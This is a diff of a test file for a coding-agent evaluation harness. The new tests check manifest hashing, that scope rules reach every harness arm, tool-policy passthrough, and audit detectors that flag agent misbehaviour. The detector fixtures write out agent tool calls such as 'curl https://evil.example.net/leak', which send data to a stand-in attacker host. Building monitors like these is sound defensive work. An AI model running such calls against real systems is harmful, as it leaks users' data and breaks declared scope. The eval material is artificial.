@@ -23,6 +23,16 @@ import type { ProgrammersLoopConfig } from "../src/config.js"
 import { lintExecPlan } from "../src/contracts/exec-plan.js"
 import { gradeEpisode, gradeExitCode } from "../src/evals/grade.js"
 import {
+  auditEpisode,
+  detectExit127,
+  detectForbiddenPathTouches,
+  detectOutOfDeclaredNetwork,
+  detectRepeatedFailingCommand,
+  extractToolCalls,
+  matchesGlob,
+} from "../src/evals/audit.js"
+import {
+  buildTaskPrompt,
   EVAL_GITIGNORE,
   gitStatusPorcelain,
   mergeEvalGitignore,
@@ -41,6 +51,7 @@ import {
 } from "../src/evals/manifest.js"
 import { planEvalRun, runEvalRun } from "../src/evals/runner.js"
 import { loadTaskPackage, type TaskPackage } from "../src/evals/task-package.js"
+import { curatedSkillsHash } from "../src/workflows/curated-skills.js"
 import { makeExecPlanReady } from "./planning-fixtures.js"
 
 const REAL_TASKS = path.resolve(import.meta.dirname, "..", "evals", "tasks")
@@ -367,6 +378,7 @@ test("manifest construction is deterministic and seeds are pure", () => {
     model: null,
     reasoningEffort: null,
     promptDirHash: "abc123",
+    curatedSkillsHash: "skills-abc",
     repoGitSha: null,
   }
   const params = {
@@ -426,6 +438,7 @@ test("reasoning effort is a frozen manifest input and changes the config hash", 
     model: "gpt-5.6-terra",
     reasoningEffort: "high",
     promptDirHash: "abc123",
+    curatedSkillsHash: "skills-abc",
     repoGitSha: "sha",
   }
   const params = {
@@ -457,6 +470,59 @@ test("reasoning effort is a frozen manifest input and changes the config hash", 
   assert.notEqual(high.configHash, nulled.configHash)
 })
 
+test("curated skill pack is a frozen manifest input: a skill-file edit changes the config hash", async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), "manifest-skills-"))
+  try {
+    const skillFile = path.join(dir, "scope-discipline", "SKILL.md")
+    await mkdir(path.dirname(skillFile), { recursive: true })
+    await writeFile(
+      skillFile,
+      "---\npriority: 10\napplies_to:\n---\n\n# Scope\n\nStay in scope.\n",
+      "utf8",
+    )
+    const base: RunConfigInputs = {
+      adapterId: "claude",
+      model: "m",
+      reasoningEffort: null,
+      promptDirHash: "abc123",
+      curatedSkillsHash: await curatedSkillsHash(dir),
+      repoGitSha: null,
+    }
+    const params = {
+      baseSeed: 1,
+      reps: 1,
+      runId: "skills",
+      taskIds: ["alpha"],
+      tasksDir: "tasks",
+    }
+    const before = buildManifest({
+      ...params,
+      systems: ["loop"],
+      configInputs: base,
+    })
+
+    // Editing a skill file changes the pack fingerprint...
+    await writeFile(
+      skillFile,
+      "---\npriority: 10\napplies_to:\n---\n\n# Scope\n\nStay strictly in scope.\n",
+      "utf8",
+    )
+    const mutated = await curatedSkillsHash(dir)
+    assert.notEqual(mutated, base.curatedSkillsHash)
+
+    // ...and that flows through into the manifest config hash (treatment
+    // identity), so the two runs are correctly marked non-comparable.
+    const after = buildManifest({
+      ...params,
+      systems: ["loop"],
+      configInputs: { ...base, curatedSkillsHash: mutated },
+    })
+    assert.notEqual(before.configHash, after.configHash)
+  } finally {
+    await rm(dir, { force: true, recursive: true })
+  }
+})
+
 test("planEvalRun threads reasoning effort from config into the manifest", async () => {
   const repoRoot = await newRepo(["smoke-json-lines"])
   try {
@@ -472,6 +538,12 @@ test("planEvalRun threads reasoning effort from config into the manifest", async
       tasksDir: "tasks",
     })
     assert.equal(manifest.configInputs.reasoningEffort, "high")
+    // The curated skill pack is fingerprinted into the frozen inputs over the
+    // real package dir — not a duplicate of promptDirHash (proves the wiring).
+    assert.equal(
+      manifest.configInputs.curatedSkillsHash,
+      await curatedSkillsHash(),
+    )
   } finally {
     await rm(repoRoot, { force: true, recursive: true })
   }
@@ -1311,4 +1383,468 @@ test("a container loop episode is refused before any spawn, with the grader-leak
   } finally {
     await rm(repoRoot, { force: true, recursive: true })
   }
+})
+
+// --- Harness hooks: scope visibility (E4), tool policy, audit signals --------
+
+/** An AgentAdapter with a fixed id and captured requests, for arm-level tests. */
+function adapterWithId(
+  id: string,
+  behavior: MockBehavior,
+): AgentAdapter & { requests: AgentRunRequest[] } {
+  const requests: AgentRunRequest[] = []
+  return {
+    id,
+    requests,
+    doctor: async () => ({ available: true, detail: id }),
+    run: async (request: AgentRunRequest) => {
+      requests.push(request)
+      return behavior(request)
+    },
+  }
+}
+
+test("scope rules are visible and byte-identical across the direct and loop arms (E4)", async () => {
+  const repoRoot = await newRepo(["smoke-json-lines"])
+  try {
+    const loaded = await loadTaskPackage(
+      path.join(REAL_TASKS, "smoke-json-lines"),
+    )
+    assert.ok(loaded.pkg, loaded.issues.join(" | "))
+    const pkg = loaded.pkg
+    const expected = buildTaskPrompt(pkg)
+    // The scope block is present: heading, the allowed path, both forbidden
+    // paths, and the closed-world rule (E4 — invisible to the agent before).
+    assert.match(expected, /Edit scope \(graded\)/)
+    assert.match(expected, /json-lines\.mjs/)
+    assert.match(expected, /index\.mjs/)
+    assert.match(expected, /README\.md/)
+    assert.match(expected, /out of scope/)
+
+    // Direct arm sends exactly buildTaskPrompt.
+    const directSandbox = path.join(repoRoot, "direct")
+    await prepareSandbox({
+      config,
+      pkg,
+      sandboxDir: directSandbox,
+      system: "direct",
+    })
+    const direct = new MockAdapter(writingBehavior(CORRECT_FIX))
+    await runDirectHarness({
+      adapter: direct,
+      config,
+      pkg,
+      sandboxDir: directSandbox,
+    })
+
+    // Loop arm (skip route for this skip-shaped task) sends the SAME text.
+    const loopSandbox = path.join(repoRoot, "loop")
+    const prepared = await prepareSandbox({
+      config,
+      pkg,
+      sandboxDir: loopSandbox,
+      system: "loop",
+    })
+    assert.ok(prepared.planPath)
+    const loop = new MockAdapter(writingBehavior(CORRECT_FIX))
+    await runLoopHarness({
+      adapter: loop,
+      config,
+      pkg,
+      planPath: prepared.planPath,
+      sandboxDir: loopSandbox,
+    })
+
+    assert.equal(direct.requests[0]?.prompt, expected)
+    assert.equal(loop.requests[0]?.prompt, expected)
+    // The fairness invariant: identical bytes, not merely "both mention scope".
+    assert.equal(direct.requests[0]?.prompt, loop.requests[0]?.prompt)
+  } finally {
+    await rm(repoRoot, { force: true, recursive: true })
+  }
+})
+
+test("the loop exec-plan spine injects the identical scope-bearing prompt into write (E4)", async () => {
+  const repoRoot = await newRepo(["smoke-retry-flag"])
+  try {
+    const { pkg, planPath, sandboxDir } = await preparedRetryFlagLoop(repoRoot)
+    const expected = buildTaskPrompt(pkg)
+    assert.match(expected, /README\.md/) // retry-flag forbids README.md
+    const loop = execPlanSpineMock()
+    await runLoopHarness({ adapter: loop, config, pkg, planPath, sandboxDir })
+    const writeReq = loop.requests.find((request) =>
+      request.prompt.startsWith("# Write an ExecPlan"),
+    )
+    assert.ok(writeReq, "spine must issue a write phase")
+    // The write prompt embeds the exact outline (= buildTaskPrompt, already
+    // trimmed), so the scope rules the direct arm shows are byte-present here too.
+    assert.ok(
+      writeReq.prompt.includes(expected),
+      "write prompt must embed the scope-bearing task prompt verbatim",
+    )
+  } finally {
+    await rm(repoRoot, { force: true, recursive: true })
+  }
+})
+
+test("the task tool policy threads into every arm's agent request", async () => {
+  const repoRoot = await newRepo(["smoke-json-lines", "smoke-retry-flag"])
+  try {
+    const jsonLines = await loadTaskPackage(
+      path.join(REAL_TASKS, "smoke-json-lines"),
+    )
+    assert.ok(jsonLines.pkg)
+    const jlPolicy: TaskPackage = {
+      ...jsonLines.pkg,
+      toolPolicy: { network: "deny", tools: { disallowed: ["WebFetch"] } },
+    }
+    const directSandbox = path.join(repoRoot, "direct")
+    await prepareSandbox({
+      config,
+      pkg: jlPolicy,
+      sandboxDir: directSandbox,
+      system: "direct",
+    })
+    const direct = new MockAdapter(writingBehavior(CORRECT_FIX))
+    await runDirectHarness({
+      adapter: direct,
+      config,
+      pkg: jlPolicy,
+      sandboxDir: directSandbox,
+    })
+    assert.deepEqual(direct.requests[0]?.toolPolicy, {
+      disallowed: ["WebFetch"],
+    })
+
+    // Loop exec-plan arm: budgetedLoopAdapter injects it into every phase call,
+    // since the workflow's runAgent never sets one.
+    const { pkg, planPath, sandboxDir } = await preparedRetryFlagLoop(repoRoot)
+    const rfPolicy: TaskPackage = {
+      ...pkg,
+      toolPolicy: { network: "deny", tools: { disallowed: ["WebFetch"] } },
+    }
+    const loop = execPlanSpineMock()
+    await runLoopHarness({
+      adapter: loop,
+      config,
+      pkg: rfPolicy,
+      planPath,
+      sandboxDir,
+    })
+    assert.ok(loop.requests.length >= 2, "spine must make multiple phase calls")
+    for (const request of loop.requests) {
+      assert.deepEqual(request.toolPolicy, { disallowed: ["WebFetch"] })
+    }
+  } finally {
+    await rm(repoRoot, { force: true, recursive: true })
+  }
+})
+
+test("a codex run records a named-tool policy as declared-not-enforced; claude does not", async () => {
+  const sandbox = await mkdtemp(path.join(tmpdir(), "not-enforced-"))
+  const stub = await buildStubGrader(DETERMINISTIC_GRADER)
+  const pkg: TaskPackage = {
+    ...stub,
+    toolPolicy: { network: "deny", tools: { disallowed: ["WebFetch"] } },
+  }
+  try {
+    // Codex cannot enforce named tools -> the harness records it on the episode.
+    const codex = adapterWithId("codex", () => baseResult({ usage: usage() }))
+    const codexOutcome = await runDirectHarness({
+      adapter: codex,
+      config,
+      pkg,
+      sandboxDir: sandbox,
+    })
+    assert.ok(
+      codexOutcome.notes.some((note) =>
+        note.includes("declared but NOT enforced"),
+      ),
+      codexOutcome.notes.join(" | "),
+    )
+    // Even unenforced, the policy still rode into the request (passthrough).
+    assert.deepEqual(codex.requests[0]?.toolPolicy, {
+      disallowed: ["WebFetch"],
+    })
+
+    // Claude enforces it, so there is no "not enforced" note.
+    const claude = adapterWithId("claude", () => baseResult({ usage: usage() }))
+    const claudeOutcome = await runDirectHarness({
+      adapter: claude,
+      config,
+      pkg,
+      sandboxDir: sandbox,
+    })
+    assert.equal(
+      claudeOutcome.notes.some((note) =>
+        note.includes("declared but NOT enforced"),
+      ),
+      false,
+    )
+    assert.deepEqual(claude.requests[0]?.toolPolicy, {
+      disallowed: ["WebFetch"],
+    })
+  } finally {
+    await rm(sandbox, { force: true, recursive: true })
+    await rm(pkg.dir, { force: true, recursive: true })
+  }
+})
+
+test("loadTaskPackage parses an optional tool_policy.tools block and tolerates its absence", async () => {
+  const repoRoot = await newRepo(["smoke-json-lines"])
+  try {
+    // Absent: existing network-only tasks still load; tools stays undefined.
+    const bare = await loadTaskPackage(
+      path.join(repoRoot, "tasks", "smoke-json-lines"),
+    )
+    assert.ok(bare.pkg, bare.issues.join(" | "))
+    assert.equal(bare.pkg.toolPolicy.tools, undefined)
+
+    // Present: the additive tools block is validated and parsed.
+    const manifestPath = path.join(
+      repoRoot,
+      "tasks",
+      "smoke-json-lines",
+      "task.yaml",
+    )
+    const source = await readFile(manifestPath, "utf8")
+    await writeFile(
+      manifestPath,
+      source.replace(
+        "tool_policy:\n  network: deny",
+        "tool_policy:\n  network: deny\n  tools:\n    disallowed:\n      - WebFetch\n      - WebSearch",
+      ),
+      "utf8",
+    )
+    const loaded = await loadTaskPackage(
+      path.join(repoRoot, "tasks", "smoke-json-lines"),
+    )
+    assert.ok(loaded.pkg, loaded.issues.join(" | "))
+    assert.deepEqual(loaded.pkg.toolPolicy.tools, {
+      disallowed: ["WebFetch", "WebSearch"],
+    })
+  } finally {
+    await rm(repoRoot, { force: true, recursive: true })
+  }
+})
+
+// Synthetic event-stream builders for the audit detectors (both adapter shapes).
+const claudeToolUse = (id: string, command: string): unknown => ({
+  type: "assistant",
+  message: {
+    content: [{ type: "tool_use", id, name: "Bash", input: { command } }],
+  },
+})
+const claudeToolResult = (
+  id: string,
+  content: string,
+  isError: boolean,
+): unknown => ({
+  type: "user",
+  message: {
+    content: [
+      { type: "tool_result", tool_use_id: id, content, is_error: isError },
+    ],
+  },
+})
+const claudeEdit = (id: string, filePath: string): unknown => ({
+  type: "assistant",
+  message: {
+    content: [
+      { type: "tool_use", id, name: "Edit", input: { file_path: filePath } },
+    ],
+  },
+})
+const codexCommand = (
+  command: string,
+  exitCode: number,
+  output = "",
+): unknown => ({
+  type: "item.completed",
+  item: {
+    type: "command_execution",
+    command,
+    exit_code: exitCode,
+    aggregated_output: output,
+    status: exitCode === 0 ? "completed" : "failed",
+  },
+})
+
+test("audit: detects a command failing 3+ times consecutively across both event shapes", () => {
+  // Claude: the same Bash command fails 3x, with an interleaved Edit that must
+  // NOT break the run (the realistic run -> fail -> edit -> run loop).
+  const claude = [
+    claudeToolUse("t1", "node --test"),
+    claudeToolResult("t1", "1 failing", true),
+    claudeEdit("e1", "cli.mjs"),
+    claudeToolUse("t2", "node --test"),
+    claudeToolResult("t2", "1 failing", true),
+    claudeToolUse("t3", "node --test"),
+    claudeToolResult("t3", "1 failing", true),
+  ]
+  const claudeSignals = detectRepeatedFailingCommand(extractToolCalls(claude))
+  assert.equal(claudeSignals.length, 1)
+  assert.equal(claudeSignals[0]?.kind, "repeated-failing-command")
+  assert.match(claudeSignals[0]?.detail ?? "", /failed 3 times/)
+
+  // Codex: same wrapped command fails 3x; the shell wrapper is stripped in the
+  // signal so the evidence is the command the model actually ran.
+  const codex = [
+    codexCommand('/bin/zsh -lc "npm test"', 1),
+    codexCommand('/bin/zsh -lc "npm test"', 1),
+    codexCommand('/bin/zsh -lc "npm test"', 1),
+  ]
+  const codexSignals = detectRepeatedFailingCommand(extractToolCalls(codex))
+  assert.equal(codexSignals.length, 1)
+  assert.equal(codexSignals[0]?.evidence[0], "npm test")
+})
+
+test("audit: no repeated-command signal below the threshold, on a break, or after a success", () => {
+  const twoFails = [
+    claudeToolUse("t1", "node --test"),
+    claudeToolResult("t1", "x", true),
+    claudeToolUse("t2", "node --test"),
+    claudeToolResult("t2", "x", true),
+  ]
+  assert.deepEqual(detectRepeatedFailingCommand(extractToolCalls(twoFails)), [])
+
+  // A success mid-run resets the failing streak.
+  const withSuccess = [
+    codexCommand("npm test", 1),
+    codexCommand("npm test", 0),
+    codexCommand("npm test", 1),
+    codexCommand("npm test", 1),
+  ]
+  assert.deepEqual(
+    detectRepeatedFailingCommand(extractToolCalls(withSuccess)),
+    [],
+  )
+
+  // A different command between failures breaks the run.
+  const interleaved = [
+    codexCommand("npm test", 1),
+    codexCommand("npm run lint", 1),
+    codexCommand("npm test", 1),
+  ]
+  assert.deepEqual(
+    detectRepeatedFailingCommand(extractToolCalls(interleaved)),
+    [],
+  )
+})
+
+test("audit: detects exit 127 structurally (Codex) and via marker (Claude)", () => {
+  const codex = [
+    codexCommand("programmers-loop lint", 127, "programmers-loop: not found"),
+  ]
+  const codexSignals = detectExit127(extractToolCalls(codex))
+  assert.equal(codexSignals.length, 1)
+  assert.equal(codexSignals[0]?.heuristic, false) // structured exit code
+  assert.match(codexSignals[0]?.detail ?? "", /exited 127/)
+
+  const claude = [
+    claudeToolUse("t1", "programmers-loop lint"),
+    claudeToolResult("t1", "zsh: command not found: programmers-loop", true),
+  ]
+  const claudeSignals = detectExit127(extractToolCalls(claude))
+  assert.equal(claudeSignals.length, 1)
+  assert.equal(claudeSignals[0]?.heuristic, true) // Claude carries no exit code
+
+  // Negative: a clean command produces nothing.
+  assert.deepEqual(
+    detectExit127(extractToolCalls([codexCommand("ls", 0, "cli.mjs")])),
+    [],
+  )
+
+  // Negative (real-data lesson): a SUCCESSFUL probe whose output merely mentions
+  // "not found" must not fire. A Codex probe carries exit 0 (structured code
+  // wins); a Claude probe succeeded (is_error false), so the marker is suppressed.
+  const codexProbe = [
+    codexCommand("command -v programmers-loop || true", 0, "not found"),
+  ]
+  assert.deepEqual(detectExit127(extractToolCalls(codexProbe)), [])
+  const claudeProbe = [
+    claudeToolUse("p1", "command -v programmers-loop || true"),
+    claudeToolResult("p1", "programmers-loop not found", false),
+  ]
+  assert.deepEqual(detectExit127(extractToolCalls(claudeProbe)), [])
+})
+
+test("audit: matchesGlob honors * within a segment and ** across segments", () => {
+  assert.equal(matchesGlob("cli.test.mjs", "*.test.mjs"), true)
+  assert.equal(matchesGlob("src/cli.test.mjs", "*.test.mjs"), false) // * stops at /
+  assert.equal(matchesGlob("src/a/b.mjs", "**"), true)
+  assert.equal(matchesGlob("src/cli.test.mjs", "**/*.test.mjs"), true)
+  assert.equal(matchesGlob("README.md", "README.md"), true)
+  assert.equal(matchesGlob("readme.md", "README.md"), false)
+})
+
+test("audit: flags changed paths outside allowed globs or matching forbidden globs", () => {
+  const scope = {
+    allowedPaths: ["cli.mjs", "*.test.mjs"],
+    forbiddenPaths: ["README.md"],
+  }
+  // All within scope -> nothing.
+  assert.deepEqual(
+    detectForbiddenPathTouches({
+      changedPaths: ["cli.mjs", "cli.test.mjs"],
+      scope,
+    }),
+    [],
+  )
+  // An explicitly forbidden file.
+  const forbidden = detectForbiddenPathTouches({
+    changedPaths: ["README.md"],
+    scope,
+  })
+  assert.equal(forbidden.length, 1)
+  assert.match(forbidden[0]?.detail ?? "", /forbidden_paths/)
+  // Outside every allowed pattern.
+  const outside = detectForbiddenPathTouches({
+    changedPaths: ["src/index.mjs"],
+    scope,
+  })
+  assert.equal(outside.length, 1)
+  assert.match(outside[0]?.detail ?? "", /outside every allowed_paths/)
+})
+
+test("audit: heuristically flags undeclared network hosts, ignoring loopback and emails", () => {
+  const calls = extractToolCalls([
+    claudeToolUse("t1", "curl https://evil.example.net/leak"),
+    claudeToolResult("t1", "ok", false),
+    codexCommand("curl http://localhost:8080/health", 0),
+    codexCommand("git config user.email=evals@example.com", 0),
+  ])
+  const signals = detectOutOfDeclaredNetwork(calls)
+  assert.equal(signals.length, 1)
+  assert.equal(signals[0]?.evidence[0], "evil.example.net")
+  assert.equal(signals[0]?.heuristic, true)
+
+  // allowedHosts extends the loopback defaults.
+  const allowed = detectOutOfDeclaredNetwork(
+    extractToolCalls([codexCommand("curl https://registry.internal/pkg", 0)]),
+    { allowedHosts: ["registry.internal"] },
+  )
+  assert.deepEqual(allowed, [])
+})
+
+test("audit: auditEpisode runs every detector over one stream", () => {
+  const events = [
+    claudeToolUse("t1", "node --test"),
+    claudeToolResult("t1", "fail", true),
+    claudeToolUse("t2", "node --test"),
+    claudeToolResult("t2", "fail", true),
+    claudeToolUse("t3", "node --test"),
+    claudeToolResult("t3", "fail", true),
+    claudeToolUse("t4", "curl https://evil.example.net"),
+    claudeToolResult("t4", "ok", false),
+  ]
+  const signals = auditEpisode({
+    events,
+    scope: { allowedPaths: ["cli.mjs"], forbiddenPaths: [] },
+    changedPaths: ["README.md"],
+  })
+  const kinds = new Set(signals.map((signal) => signal.kind))
+  assert.ok(kinds.has("repeated-failing-command"))
+  assert.ok(kinds.has("out-of-declared-network"))
+  assert.ok(kinds.has("forbidden-path-touch"))
 })
